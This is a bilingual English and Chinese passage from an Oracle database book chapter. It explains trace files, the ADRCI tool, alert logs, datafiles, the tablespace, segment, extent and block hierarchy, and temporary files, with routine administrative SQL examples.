  \ `ORA-00600` 或其他内部错误生成的跟踪文件——来结束本节。我们能对它们做些什么呢？简而言之，通常来说，它们并不是为你我准备的。它们对 Oracle\
  \ 支持团队有用。然而，当我们向 Oracle 支持提交服务请求时，它们可能会提供帮助。这一点至关重要：如果你遇到了内部错误，唯一的修正途径就是提交服务请求（SR）。如果你只是忽略它们，它们不会自行修复，除非是偶然情况。\n\
  \n例如，在 Oracle 10g Release 1 中，如果你创建如下表并运行查询，你很可能会遇到一个内部错误（也可能不会；它被记录为一个 Bug，并在后续的补丁版本中修复）：\n\
  \n```\nSQL> create table t ( x int primary key );\nTable created.\nSQL> insert into\
  \ t values ( 1 );\n1 row created.\nSQL> exec dbms_stats.gather_table_stats( user,\
  \ 'T' );\nPL/SQL procedure successfully completed.\nSQL> select count(x) over ()\
  \   from t;\n*\nERROR at line 2:\nORA-00600: internal error code, arguments: [12410],\
  \ [], [], [], [], [], [], []\n```\n\n现在，假设你是 DBA，突然在跟踪区域出现了这个跟踪文件。或者你是开发人员，你的应用程序抛出了一个\
  \ `ORA-00600` 错误，你想查明发生了什么。那个跟踪文件里有很多信息（实际上大约有 35,000 行），但通常对你我来说没什么用。我们通常只会压缩跟踪文件，并将其作为服务请求处理的一部分上传。\n\
  \n一个命令行工具，结合通过 Enterprise Manager 提供的用户界面，可以让你查看 ADR 中的跟踪信息，并将其打包传输给 Oracle 支持。自动诊断仓库命令解释器（`ADRCI`）实用程序允许你查看“问题”（数据库中的关键错误）和“事件”（这些关键错误的发生实例），并将它们打包传输给支持团队。打包步骤不仅包括检索跟踪信息，还包括来自数据库警报日志的详细信息以及其他配置/测试用例信息。例如，我在我的数据库中设置了一个引发关键错误的场景。（不，我不会说是什么。你得自己制造你的关键错误。）我知道我的数据库中有一个“问题”，因为\
  \ `ADRCI` 工具是这么告诉我的：\n\n```\n$ adrci\nadrci> show problem\nADR Home = /opt/oracle/diag/rdbms/cdb/CDB:\n\
  *************************************************************************\nPROBLEM_ID\
  \           PROBLEM_KEY                                                 LAST_INCIDENT\
  \        LASTINC_TIME\n-------------------- -----------------------------------------------------------\
  \ -------------------- ----------------------------------------\n1             \
  \       ORA 700 [pga physmem limit]                                 19209      \
  \          2021-02-15 00:37:58.332000 +00:00\n```\n\n最近我的数据库中发生了一个 `ORA-700` 错误。我现在可以通过执行\
  \ `show incident` 命令来查看该错误影响了什么：\n\n```\nadrci> show incident\nINCIDENT_ID  PROBLEM_KEY\
  \                  CREATE_TIME\n------------ ---------------------------  -------------------------\n\
  1            ORA 700 [pga physmem limit]   021-01-24 19:33:31.863000 +00:00\n2402\
  \         ORA 700 [pga physmem limit]   021-01-24 19:34:50.006000 +00:00\n4803 \
  \        ORA 700 [pga physmem limit]   021-01-24 19:35:20.619000 +00:00\n7204  \
  \       ORA 700 [pga physmem limit]   021-01-24 19:42:03.463000 +00:00\n9605   \
  \      ORA 700 [pga physmem limit]   021-01-24 19:49:46.391000 +00:00\n```\n\n我看到有多个事件，可以通过\
  \ `show tracefile` 命令来识别与每个事件相关的信息：\n\n```\nadrci> show tracefile -I 2402\ndiag/rdbms/cdb/CDB/incident/incdir_2402/CDB_ora_5317_i2402.trc\n\
  ```\n\n这显示了所列事件编号对应的跟踪文件位置。此外，如果我选择的话，我可以看到关于该事件的大量详细信息：\n\n```\nadrci> show incident\
  \ -mode detail -p \"incident_id=2402\"\nADR Home = /opt/oracle/diag/rdbms/cdb/CDB:\n\
  *************************************************************************\n**********************************************************\n\
  INCIDENT INFO RECORD 1\n**********************************************************\n\
  INCIDENT_ID                   2402\nSTATUS                        ready\nCREATE_TIME\
  \                   2021-01-24 19:34:50.006000 +00:00\nPROBLEM_ID              \
  \      1\nCLOSE_TIME                    \nFLOOD_CONTROLLED              none\nERROR_FACILITY\
  \                ORA\nERROR_NUMBER                  700\nERROR_ARG1            \
  \        pga physmem limit\n...\n```\n\n最后，我可以为该事件创建一个对支持团队有用的“包”。这个包将包含支持分析师开始处理问题所需的所有信息。\n\
  \n本节无意成为 `ADRCI` 实用程序的全面概述或入门介绍，该工具在《*Oracle Database Utilities*》手册中有完整记录。相反，我只想介绍这个工具的存在——一个让使用跟踪文件变得轻松的工具。\n\
  \n当你前往 [`http://support.oracle.com`](http://support.oracle.com) 提交服务请求或搜索你遇到的问题是否已知时，这些数据库信息是很重要的。此外，你可以看到错误发生的\
  \ Oracle 实例。同时运行多个实例是很常见的情况，因此将问题隔离到单个实例是很有用的。\n\n以下是跟踪文件中另一部分需要注意的内容：\n\n```\n\
  *** SESSION ID:(266.55448) 2021-02-15T15:39:09.939349+00:00\n*** CLIENT ID:() 2021-02-15T15:39:09.939354+00:00\n\
  *** SERVICE NAME:(SYS$USERS) 2021-02-15T15:39:09.939358+00:00\n*** MODULE NAME:(sqlplus@localhost\
  \ (TNS V1-V3)) 2021-02-15T15:39:09.939364+00:00\n*** ACTION NAME:() 2021-02-15T15:39:09.939368+00:00\n\
  *** CLIENT DRIVER:(SQL*PLUS) 2021-02-15T15:39:09.939372+00:00\n*** CONTAINER ID:(1)\
  \ 2021-02-15T15:39:09.939376+00:00\n```\n\n跟踪文件的这一部分显示了 `V$SESSION` 中 `ACTION` 和\
  \ `MODULE` 列可用的会话信息。这里，我们可以看到是一个 `SQL*Plus` 会话导致了错误抛出（你和你的开发人员可以并且应该设置 `ACTION`\
  \ 和 `MODULE` 信息；像 Oracle Forms 和 APEX 这样的环境已经为你做了这件事）。\n\n此外，我们还有 `SERVICE NAME`。这是用于连接到数据库的实际服务名称——本例中是\
  \ `SYS$USERS`——表明我们不是通过 TNS 服务连接的。如果我们使用 `user/pass@CDB` 登录，我们可能会看到：\n\n```\n***\
  \ SERVICE NAME:(CDB) 2021-02-15T15:55:42.704845+00:00\n```\n\n这里，`CDB` 是服务名称（不是\
  \ TNS 连接字符串；而是它连接到的、在 TNS 监听器中注册的最终服务）。这对于追踪哪个进程或模块受此错误影响也很有用。\n\n最后，在我们看到实际错误之前，我们可以看到会话\
  \ ID（本例中为 266）、会话序列号（本例中为 55448）以及相关的日期/时间信息（所有版本都有）作为进一步的识别信息：\n\n```\n*** SESSION\
  \ ID:(266.55448) 2021-02-15T15:39:09.939349+00:00\n```\n\n从这里开始，你可以进一步深入挖掘跟踪文件，并尝试确定是什么导致了问题。其他重要的信息片段包括错误代码（通常是\
  \ 600、3113 或 7445）以及与错误代码相关的其他参数。利用这些信息，加上一些显示按顺序调用的 Oracle 内部子程序集合的堆栈跟踪信息，我们或许能够找到一个已知的\
  \ Bug（以及解决方法、补丁等）。\n\n\nTypically, you’ll do a Google search of any relevant error\
  \ messages. If you don’t readily find an answer, you can create a service request\
  \ with Oracle Support and attach the trace files to the request. Oracle Support\
  \ can help you identify if you’ve hit a bug or provide options on workarounds.\n\
  通常，您会针对任何相关的错误消息进行一次 Google 搜索。如果未能迅速找到答案，您可以向 Oracle 支持创建一个服务请求，并将跟踪文件附加到该请求中。Oracle\
  \ 支持可以帮助您确定是否遇到了错误，或提供变通方法的选项。\n\n### Trace File Wrap-Up\n### 跟踪文件总结\n\nYou now\
  \ know the two types of general trace files, where they are located, and how to\
  \ find them. Hopefully, you’ll use trace files mostly for tuning and increasing\
  \ the performance of your application, rather than for filing service requests.\
  \ As a last note, Oracle Support does have access to many undocumented “events”\
  \ that are very useful for dumping out tons of diagnostic information whenever the\
  \ database hits any error. For example, if you are getting an `ORA-01555 Snapshot\
  \ Too Old` that you absolutely feel you should not be getting, Oracle Support can\
  \ guide you through the process of setting such diagnostic events to help you track\
  \ down precisely why that error is getting raised, by creating a trace file every\
  \ time that error is encountered.\n现在您已经了解了两种通用跟踪文件、它们的存放位置以及如何找到它们。希望您主要将跟踪文件用于调整和提升应用程序性能，而非用于提交服务请求。最后要说明的是，Oracle\
  \ 支持确实可以访问许多未公开的“事件”，这些事件在数据库遇到任何错误时，对于转储大量诊断信息非常有用。例如，如果您遇到了一个 `ORA-01555 Snapshot\
  \ Too Old` 错误，并且您确信自己本不应遇到此错误，Oracle 支持可以指导您完成设置此类诊断事件的过程，以帮助您精确追踪错误发生的原因——方法是在每次遇到该错误时创建一个跟踪文件。\n\
  \n## Alert Log File\n## 告警日志文件\n\nThe alert file (also known as the alert log) is\
  \ the diary of the database. It is a simple text file written to from the day the\
  \ database is “born” (created) to the end of time (when you erase it). In this file,\
  \ you’ll find a chronological history of your database—the log switches; the internal\
  \ errors that might be raised; when tablespaces were created, taken offline, put\
  \ back online; and so on. It is an incredibly useful file for viewing the history\
  \ of a database. I like to let mine grow fairly large before “rolling” (archiving)\
  \ it. The more information, the better, I believe, for this file. I will not describe\
  \ everything that goes into an alert log—that’s a fairly broad topic. I encourage\
  \ you to take a look at yours, however, and see the wealth of information it holds.\n\
  告警文件（也称为告警日志）是数据库的日志。这是一个简单的文本文件，从数据库“诞生”（创建）之日开始写入，直到时间尽头（当您删除它时）。在这个文件中，您会找到按时间顺序记录的数据库历史——日志切换；可能出现的内部错误；表空间何时创建、离线、重新上线；等等。对于查看数据库历史而言，这是一个极其有用的文件。我喜欢让我的文件增长到相当大之后再“滚动”（归档）。我相信，这个文件包含的信息越多越好。我不会描述告警日志中记录的所有内容——这是一个相当广泛的话题。不过，我建议您查看一下自己的告警日志，看看其中包含的丰富信息。\n\
  \nTo determine the location of the text-based alert log for your database, run the\
  \ following query:\n要确定数据库基于文本的告警日志的位置，请运行以下查询：\n\n```\nSQL> select value from v$diag_info,\
  \ v$instance where name = 'Diag Trace';\nVALUE\n\n/opt/oracle/diag/rdbms/cdb/CDB/trace\n\
  ```\n\nThe name of the alert log will be of this format:\n告警日志的名称格式如下：\n\n```\n\
  alert_.log\n```\n\nYou can generate the location and name of the alert log with\
  \ the following query:\n您可以使用以下查询生成告警日志的位置和名称：\n\n```\nSQL> select value || '/alert_'\
  \ || instance_name || '.log' from v$diag_info, v$instance\nwhere name = 'Diag Trace';\n\
  VALUE||'/ALERT_'||INSTANCE_NAME||'.LOG'\n\n/opt/oracle/diag/rdbms/cdb/CDB/trace/alert_CDB.log\n\
  ```\n\nIf you want to view the location of the XML-based alert log, run this query:\n\
  如果您想查看基于 XML 的告警日志的位置，请运行此查询：\n\n```\nSQL> select value from v$diag_info where name\
  \ = 'Diag Alert';\n```\n\nIt’s worth noting that there is an internal table, `X$DBGALERTEXT`,\
  \ that you can query from `SQL*Plus` which derives its information from the alert\
  \ log. This table requires `SYS` privileges to view. For example, as `SYS`, you\
  \ can query the alert log for `ORA-` errors as follows:\n值得注意的是，存在一个内部表 `X$DBGALERTEXT`，您可以从\
  \ `SQL*Plus` 中查询该表，其信息来源于告警日志。查看此表需要 `SYS` 权限。例如，作为 `SYS` 用户，您可以按如下方式查询告警日志中的 `ORA-`\
  \ 错误：\n\n```\n$ sqlplus / as sysdba\nSQL> select record_id,\nto_char(originating_timestamp,'DD.MM.YYYY\
  \ HH24:MI:SS'),\nmessage_text\nfrom x$dbgalertext\nwhere message_text like '%ORA-%';\n\
  ```\n\nTip\n提示\n\nOracle Support has a note on how to edit, read, and query the\
  \ alert log (Doc ID 1072547.1).\nOracle 支持有一份关于如何编辑、读取和查询告警日志的说明（文档 ID 1072547.1）。\n\
  \nIn addition to using an external table to query the alert log, you can easily\
  \ view the alert log using the `ADRCI` tool. That tool lets you find, edit (review),\
  \ and monitor (interactively display new records as they appear in the alert log).\
  \ Also, `Enterprise Manager` provides access to the alert log.\n除了使用外部表查询告警日志外，您还可以使用\
  \ `ADRCI` 工具轻松查看告警日志。该工具允许您查找、编辑（查看）和监控（交互式显示告警日志中出现的新记录）。此外，`Enterprise Manager`\
  \ 也提供了访问告警日志的途径。\n\nGenerally speaking, when the need arises to view the alert log,\
  \ most DBAs will navigate directly to the alert log location. Once there, they’ll\
  \ use operating system utilities such as `vi`, `tail`, and `grep` to extract information.\n\
  一般来说，当需要查看告警日志时，大多数 DBA 会直接导航到告警日志的位置。到达那里后，他们会使用操作系统实用程序（如 `vi`、`tail` 和 `grep`）来提取信息。\n\
  \nTip\n提示\n\nWith Oracle 19c and above, there’s also an `attention.log` file that\
  \ contains information regarding critical events in your database (startup, shutdown,\
  \ invalid memory parameters, and so on). It is located in the `$ORACLE_BASE/diag/rdbms/<database_name>/<instance_name>/log`\
  \ directory.\n对于 Oracle 19c 及更高版本，还有一个 `attention.log` 文件，其中包含有关数据库关键事件（启动、关闭、无效内存参数等）的信息。它位于\
  \ `$ORACLE_BASE/diag/rdbms/<database_name>/<instance_name>/log` 目录中。\n\n## Datafiles\n\
  ## 数据文件\n\nDatafiles , along with redo log files, are the most important type of\
  \ files in the database. This is where all of your data will ultimately be stored.\
  \ Every database has at least one datafile associated with it and typically has\
  \ many more than one. You can view the datafiles for your database by querying the\
  \ data dictionary. The names of the datafiles will vary depending on whether you’re\
  \ using RAC (with datafiles on ASM disk) and/or Oracle Managed Files (OMF). For\
  \ example, here are the datafiles in a RAC container database, using ASM disks,\
  \ and the OMF naming convention:\n数据文件与重做日志文件一起，是数据库中最重要的文件类型。所有数据最终都将存储在这里。每个数据库至少有一个与之关联的数据文件，通常不止一个。您可以通过查询数据字典来查看数据库的数据文件。数据文件的名称会根据您是否使用\
  \ RAC（数据文件位于 ASM 磁盘上）和/或 Oracle 托管文件 (OMF) 而有所不同。例如，以下是一个 RAC 容器数据库中使用 ASM 磁盘和 OMF\
  \ 命名约定的数据文件：\n\n```\nSQL> select name from v$datafile;\nNAME\n\n+DATA/CDB/DATAFILE/system.257.1064287113\n\
  +DATA/CDB/DATAFILE/sysaux.258.1064287137\n+DATA/CDB/DATAFILE/undotbs1.259.1064287153\n\
  +DATA/CDB/86B637B62FE07A65E053F706E80A27CA/DATAFILE/system.265.1064287787\n+DATA/CDB/86B637B62FE07A65E053F706E80A27CA/DATAFILE/sysaux.266.1064287787\n\
  +DATA/CDB/DATAFILE/users.260.1064287153\n+DATA/CDB/86B637B62FE07A65E053F706E80A27CA/DATAFILE/undotbs1.267.1064287787\n\
  +DATA/CDB/DATAFILE/undotbs2.269.1064288035\n+DATA/CDB/BB1C6AAC137C6A4DE0536638A8C06678/DATAFILE/system.274.1064288517\n\
  +DATA/CDB/BB1C6AAC137C6A4DE0536638A8C06678/DATAFILE/sysaux.275.1064288517\n```\n\
  \nThe prior output shows three `SYSTEM` datafiles (where the Oracle data dictionary\
  \ is stored). One is for the root container database, and the other two are associated\
  \ with pluggable databases. The long random string in the directory path is the\
  \ GUID (unique identifier) associated with the pluggable databases when using OMF\
  \ files.\n前面的输出显示了三个 `SYSTEM` 数据文件（Oracle 数据字典存储于此）。一个是根容器数据库的，另外两个与可插拔数据库关联。目录路径中的长随机字符串是使用\
  \ OMF 文件时与可插拔数据库关联的 GUID（唯一标识符）。\n\nListed next are the datafiles in a single instance\
  \ container database (not using OMF):\n接下来列出的是单实例容器数据库（未使用 OMF）中的数据文件：\n\n```\n\
  SQL> select name from v$datafile;\nNAME\n\n/opt/oracle/oradata/CDB/system01.dbf\n\
  /opt/oracle/oradata/CDB/sysaux01.dbf\n/opt/oracle/oradata/CDB/undotbs01.dbf\n/opt/oracle/oradata/CDB/pdbseed/system01.dbf\n\
  /opt/oracle/oradata/CDB/pdbseed/sysaux01.dbf\n/opt/oracle/oradata/CDB/users01.dbf\n\
  /opt/oracle/oradata/CDB/pdbseed/undotbs01.dbf\n/opt/oracle/oradata/CDB/PDB1/system01.dbf\n\
  /opt/oracle/oradata/CDB/PDB1/sysaux01.dbf\n/opt/oracle/oradata/CDB/PDB1/undotbs01.dbf\n\
  /opt/oracle/oradata/CDB/PDB1/users01.dbf\n/opt/oracle/oradata/CDB/PDB2/system01.dbf\n\
  /opt/oracle/oradata/CDB/PDB2/sysaux01.dbf\n/opt/oracle/oradata/CDB/PDB2/undotbs01.dbf\n\
  /opt/oracle/oradata/CDB/PDB2/users01.db\n```\n\nThe datafiles in this directory\
  \ `/opt/oracle/oradata/CDB` belong to the root container. The datafiles in subdirectories\
  \ belong to pluggable databases. Each database will usually (minimally) have the\
  \ following datafiles:\n此目录 `/opt/oracle/oradata/CDB` 中的数据文件属于根容器。子目录中的数据文件属于可插拔数据库。每个数据库通常（至少）具有以下数据文件：\n\
  \n*   `SYSTEM`: Stores the Oracle data dictionary\n    *   `SYSTEM`: 存储 Oracle 数据字典\n\
  \n*   `SYSAUX`: Contains other non-dictionary objects\n    *   `SYSAUX`: 包含其他非数据字典对象\n\
  \n*   `UNDO`: Stores the undo segments used for rollback operations\n    *   `UNDO`:\
  \ 存储用于回滚操作的撤消段\n\n*   `USERS`: A default tablespace to be used for application data\
  \ (if no other tablespace is designated)\n    *   `USERS`: 一个默认表空间，用于存放应用程序数据（如果未指定其他表空间）\n\
  \nAfter a brief review of file system types, we’ll discuss how Oracle organizes\
  \ these files and how data is organized within them. To understand this, you need\
  \ to know what tablespaces, segments, extents, and blocks are. These are the units\
  \ of allocation that Oracle uses to hold objects in the database, and I describe\
  \ them in detail shortly.\n在简要回顾了文件系统类型之后，我们将讨论 Oracle 如何组织这些文件以及数据如何在其中组织。要理解这一点，您需要了解什么是表空间、段、区和块。这些是\
  \ Oracle 用来在数据库中保存对象的分配单元，我将在稍后详细描述它们。\n\n### Oracle 数据库文件系统机制简述\n\nOracle 中有三种用于存储数据的文件系统机制。这里所说的数据，指的是您的数据字典、重做日志、撤销日志、表、索引、大对象（LOBs）等——这些最终您所关心的数据。简而言之，它们是：\n\
  \n*   **“常规”操作系统文件系统**：这些文件出现在文件系统中，就像您的文字处理文档一样。您可以在 Windows 资源管理器中看到它们；在 UNIX/Linux\
  \ 中，可以通过 `ls` 命令看到它们。您可以使用简单的操作系统实用工具来移动它们，例如 Windows 上的 `xcopy` 或 UNIX/Linux 上的\
  \ `cp`。从历史上看，常规操作系统文件是 Oracle 存储数据最流行的方法。在 RAC 环境中，则会使用 ASM 磁盘类型（稍后详述）。常规文件系统通常也是带缓冲的，这意味着当您读取时，操作系统会为您缓存信息，在某些写入情况下也是如此。\n\
  \n*   **自动存储管理**：ASM 是一种专为数据库使用而设计的文件系统。可以将其简单理解为一个数据库文件系统。您不会在这个特定的文件系统上用文本文件存储购物清单——这里只存储与数据库相关的信息：表、索引、备份、控制文件、参数文件、重做日志、归档日志等等。但即便在\
  \ ASM 中，也存在等同于数据文件的概念；从逻辑上讲，数据仍然存储在文件中，但文件系统是 ASM。ASM 设计用于单机或集群环境。从 Oracle 11g Release\
  \ 2 开始，ASM 不仅提供这种数据库文件系统，还可选择提供一个集群文件系统，下文将对此进行描述。\n\n*   **集群文件系统**：这专用于 RAC（集群）环境，提供一个在集群环境中被多个节点（计算机）共享的、类似常规文件系统的结构。传统的常规文件系统在集群环境中只能由一台计算机使用。因此，虽然您确实可以通过\
  \ NFS `挂载` 或 Samba `共享`（一种在 Windows/UNIX/Linux 环境中类似于 NFS 的磁盘共享方法）在集群的多个节点间共享一个常规文件系统，但这代表了一个单点故障。如果拥有该文件系统并执行共享的节点发生故障，该文件系统将不可用。在\
  \ Oracle 11g Release 2 之前的版本中，Oracle 集群文件系统是 Oracle 在此领域的解决方案，目前仅适用于 Windows 和 UNIX/Linux。其他第三方供应商也提供经认证的、可与\
  \ Oracle 配合使用的集群文件系统。Oracle 11g Release 2 提供了另一个选择，即 Oracle 自动存储管理集群文件系统。集群文件系统将常规文件系统的便利性带到了集群环境中。\n\
  \n有趣的是，一个数据库可能由来自前述任何或所有文件系统的文件组成——您无需只选择一种。您可以拥有一个数据库，其部分数据存储在传统的常规文件系统中，部分在原始分区中，部分在\
  \ ASM 中，而其他组件则在集群文件系统中。这使得从一种技术迁移到另一种技术，或者仅仅尝试新的文件系统类型（而无需将整个数据库移入其中）变得相当容易。现在，由于全面讨论文件系统及其所有详细属性超出了本书的范围，我们将重新深入探讨\
  \ Oracle 文件类型。无论文件存储在常规文件系统、原始分区、ASM 内部还是集群文件系统上，以下概念始终适用。\n\n注意\n\n原始分区在 Oracle\
  \ 11g 中已弃用，在 Oracle 12c 中已完全不再支持。\n\n### Oracle 数据库中的存储层次结构\n\n数据库由一个或多个*表空间*组成。表空间是\
  \ Oracle 中的一个逻辑存储容器，位于存储层次结构的顶端，由一个或多个数据文件组成。这些文件可能是文件系统中的常规文件、原始分区、ASM 管理的数据库文件或集群文件系统上的文件。表空间包含段，如下所述。\n\
  \n#### 段\n\n*段* 是表空间内的主要组织结构。段就是消耗存储空间的数据库对象——通常是表、索引、撤销段等对象。大多数时候，当您创建一个表时，您就创建了一个表段。当您创建一个分区表时，您并不是在创建一个表段，而是为每个分区创建一个段。当您创建一个索引时，通常创建一个索引段，依此类推。每个消耗存储空间的对象最终都存储在一个单独的段中。有撤销段、临时段、簇段、索引段等等。\n\
  \n注意\n\n读到“每个消耗存储空间的对象最终都存储在一个单独的段中”可能会令人困惑。您会发现许多 `CREATE` 语句创建的是多段对象。困惑在于，单个 `CREATE`\
  \ 语句最终可能创建包含零个、一个或多个段的对象！例如，\n```\nCREATE TABLE T ( x int primary key, y clob )\n\
  ```\n将创建四个段：一个用于 `TABLE T`，一个用于为主键创建的索引，两个用于 `CLOB`（一个段是 `LOB` 索引，另一个段是 `LOB` 数据本身）。另一方面，\n\
  ```\nCREATE TABLE T ( x int, y date ) cluster MY_CLUSTER\n```\n将创建*零*个段（在这种情况下，簇本身就是该段）。我们将在第\
  \ 10 章进一步探讨这个概念。\n\n#### 区\n\n段由一个或多个*区*组成。区是在文件中逻辑上连续分配的一块空间。（文件本身通常在磁盘上并不是连续的；否则，我们永远不需要磁盘碎片整理工具！此外，借助独立磁盘冗余阵列等磁盘技术，您可能会发现单个文件也跨越多个物理磁盘。）传统上，每个段至少以一个区开始。Oracle\
  \ 11g Release 2 引入了“延迟”段的概念——一个不会立即分配区的段，因此在该版本及后续版本中，一个段可能会推迟分配其初始区，直到数据被插入其中。当一个对象需要增长到超出其初始区时，它将请求再分配一个区给它。这第二个区不一定位于磁盘上紧邻第一个区的位置——它甚至很可能与第一个区不在同一个文件中。第二个区可能距离第一个区非常远，但区内的空间在文件中总是逻辑上连续的。区的大小从一个\
  \ Oracle 数据块（稍后解释）到数 GB 不等。\n\n\n#### 区块\n\n区段又由区块组成。区块是 Oracle 中空间分配的最小单位。你的数据行、索引条目或临时排序结果都存储在区块中。区块是\
  \ Oracle 通常从磁盘读取和写入的对象。Oracle 中的区块通常有四种常见大小：`2KB`、`4KB`、`8KB`或`16KB`（尽管在某些情况下`32KB`也是允许的；但操作系统对最大尺寸有限制）。\n\
  \n注意\n\n根据 Oracle 的数据库参考文档，最小区块大小为`2048`，更大的区块大小必须是操作系统物理区块大小的倍数。\n\n段、区段和区块之间的关系如图\
  \ 3-1 所示。\n\n![../images/319655_4_En_3_Chapter/319655_4_En_3_Fig1_HTML.jpg](img/319655_4_En_3_Fig1_HTML.jpg)\n\
  \n图 3-1：段、区段和区块\n\n一个段由一个或多个区段组成，而一个区段是逻辑上连续分配的一组区块。一个数据库中最多可以有六种不同的区块大小。\n\n注意\n\
  \n引入这种多区块大小的特性是为了使可传输表空间能在更多情况下使用。传输表空间的能力允许数据库管理员（DBA）将一个数据库中已经格式化好的数据文件移动或复制到另一个数据库——例如，立即复制在线事务处理（OLTP）数据库中的所有表和索引到数据仓库（DW）。然而，在许多情况下，OLTP\
  \ 数据库可能使用较小的区块大小，如`2KB`或`4KB`，而 DW 则使用大得多的区块（`8KB`或`16KB`）。如果单个数据库不支持多种区块大小，你将无法传输这些信息。具有多种区块大小的表空间应用于促进表空间的传输；它们通常不用于其他目的。\n\
  \n会有一个数据库默认区块大小，这是在执行`CREATE DATABASE`命令时在初始化文件中指定的大小。`SYSTEM`表空间始终使用此默认区块大小，但随后你可以创建具有`2KB`、`4KB``8KB`、`16KB`等非默认区块大小的其他表空间，并根据操作系统的不同，还可以使用`32KB`。区块大小的总数是六种，当且仅当你在数据库创建期间指定了非标准区块大小（不是\
  \ 2 的幂）。因此，出于所有实际目的，一个数据库最多将有五种区块大小：默认大小，然后是另外四种非默认大小。\n\n任何给定的表空间将具有一致的区块大小，这意味着该表空间中的每个区块大小相同。一个多段对象，例如带有\
  \ LOB 列的表，其每个段可能位于具有不同区块大小的表空间中，但任何给定的段（包含在表空间中）将由大小完全相同的区块组成。\n\n大多数区块，无论其大小如何，都具有相同的一般格式，看起来类似于图\
  \ 3-2。\n\n![../images/319655_4_En_3_Chapter/319655_4_En_3_Fig2_HTML.jpg](img/319655_4_En_3_Fig2_HTML.jpg)\n\
  \n图 3-2：区块的结构\n\n这种格式的例外情况包括 LOB 段区块和 Exadata 存储中的混合列压缩区块等，但数据库中的绝大多数区块都将类似于图 3-2\
  \ 中的格式。区块头包含有关区块类型（表区块、索引区块等）的信息、相关时的事务信息（只有受事务管理的区块才有此信息——例如，临时排序区块就不会有）以及区块在磁盘上的地址（位置）。\n\
  \n接下来的两个区块组件存在于最常见的数据库区块类型中，即堆组织表的区块。我们将在第 10 章更详细地介绍数据库表类型，但可以说大多数表都属于此类型。\n\n\
  表目录（如果存在）包含有关在该区块中存储行的表的信息（来自多个表的数据可能存储在同一个区块上）。行目录包含描述区块上行的信息。这是一个指向区块数据部分中行位置的指针数组。这三个区块部分统称为区块开销（block\
  \ overhead），这是区块上用于 Oracle 管理区块本身的空间，不能用于你的数据。\n\n剩下的两个区块部分很简单：区块上可能有空闲空间，然后通常会有当前存储数据的已用空间。\n\
  \n现在你已经对段（由区段组成，区段又由区块组成）有了初步了解，让我们更仔细地看看表空间，然后具体了解文件是如何融入大局的。\n\n#### 表空间\n\n如前所述，表空间是一个容器——它容纳段。每个段都只属于一个表空间。一个表空间内可以有许多段。一个给定段的所有区段都将在与该段关联的表空间中找到。段永远不会跨越表空间边界。一个表空间本身有一个或多个与之关联的数据文件。表空间中任何给定段的一个区段将完全包含在一个数据文件中。然而，一个段可能拥有来自许多不同数据文件的区段。图形上，一个表空间可能如图\
  \ 3-3 所示。\n\n![../images/319655_4_En_3_Chapter/319655_4_En_3_Fig3_HTML.jpg](img/319655_4_En_3_Fig3_HTML.jpg)\n\
  \n图 3-3：一个包含两个数据文件、三个段和四个区段的表空间\n\n图 3-3 显示了一个名为`USER_DATA`的表空间。它由两个数据文件组成：`user_data01.dbf`和`user_data02.dbf`。它分配了三个段：`T1`、`T2`和`I1`（可能是两个表和一个索引）。表空间内分配了四个区段，每个区段被描绘为逻辑上连续的一组数据库区块。段`T1`由两个区段组成，每个文件中一个区段。段`T2`和`I1`各有一个区段。如果我们需要更多此表空间的空间，我们可以调整已分配给表空间的数据文件的大小，或者我们可以向其添加第三个数据文件。\n\
  \n表空间是 Oracle 中的逻辑存储容器。作为开发人员，我们将在表空间中创建段。我们永远不会涉及到原始文件级别——我们不会指定希望我们的区段在特定文件中分配（我们可以，但一般不会）。相反，我们在表空间中创建对象，其余的由\
  \ Oracle 处理。如果将来某个时候，数据库管理员决定在磁盘上移动我们的数据文件以更均匀地分配 I/O，这对我们来说没问题。它不会影响我们的任何处理。\n\n\
  #### 存储层次结构总结\n\n总之，Oracle 中的存储层次结构如下：\n\n1.  一个*数据库*由一个或多个表空间组成。\n2.  一个*表空间*由一个或多个数据文件组成。这些文件可以是文件系统中的普通文件、原始分区、ASM\
  \ 管理的数据库文件或集群文件系统上的文件。表空间包含段。\n3.  一个*段*（`TABLE`、`INDEX`等）由一个或多个区段组成。一个段存在于一个表空间中，但可能在该表空间的多个数据文件中拥有数据。\n\
  4.  一个*区段*是磁盘上逻辑上连续的一组区块。一个区段在一个表空间中，并且进一步地说，总是在该表空间内的一个文件中。\n5.  一个*块*是数据库中分配的最小单位。区块是数据库在数据文件上使用的最小\
  \ I/O 单元。\n\n\n\n## 临时文件\n\nOracle 中的临时数据文件（临时文件）是一种特殊类型的数据文件。当内存不足以容纳所有数据时，Oracle\
  \ 会使用临时文件来存储大型排序操作和哈希操作的中间结果，以及存储全局临时表数据或结果集数据。临时表空间还可以保存在全局临时表上执行操作所产生的 `UNDO`。永久数据对象（如表或索引）永远不会存储在临时文件中，但临时表及其索引的内容会存储在其中。因此，你永远不会在临时文件中创建应用程序表，但在使用临时表时，可能会将数据存储在那里。\n\
  \nOracle 以特殊方式处理临时文件。通常，你对对象所做的每次更改都会记录在重做日志中；这些事务日志可以在以后\"重做事务\"，例如在从故障中恢复时。临时文件被排除在此过程之外。具体来说，全局临时表（位于临时文件中）的事务永远不会为其生成\
  \ `REDO`，尽管它们可以生成 `UNDO`。因此，在使用临时表时可能会生成 `REDO`，因为 `UNDO` 总是由 `REDO` 保护，正如你将在第 9\
  \ 章中详细看到的那样。为全局临时表生成的 `UNDO` 是为了支持回滚你在会话中已完成的工作，无论是由于处理数据时出错还是由于某些一般事务失败。DBA 永远不需要备份临时数据文件，事实上，尝试这样做是在浪费时间，因为你永远无法恢复临时数据文件。\n\
  \n注意\n\n在 Oracle 12*c* 及以上版本中，为全局临时表生成的 `UNDO` 可以存储在临时表空间中。默认情况下，`UNDO` 会像以前的版本一样生成到永久的\
  \ `UNDO` 表空间中。可以设置一个 `init.ora` 系统级参数或 `TEMP_UNDO_ENABLED` 会话级可设置参数为 `TRUE`，以启用为全局临时表生成的\
  \ `UNDO` 存储在临时文件中。通过这种方式，这些操作将不会生成 `REDO`。我们将在第 9 章中进一步研究这一点。\n\n真正临时文件的一个细微差别是，如果操作系统允许，临时文件将以稀疏方式创建——也就是说，它们实际上直到需要时才会消耗磁盘存储空间。你可以通过以下示例轻松看到这一点（在\
  \ Oracle Linux 上）：\n\n```\nSQL> !df -h /tmp\nFilesystem            Size  Used Avail\
  \ Use% Mounted on\n/dev/mapper/VolGroup-lv_root\n50G  6.5G   41G  14% /\nSQL> create\
  \ temporary tablespace temp_huge tempfile '/tmp/temp_huge.dbf' size 2g;\nTablespace\
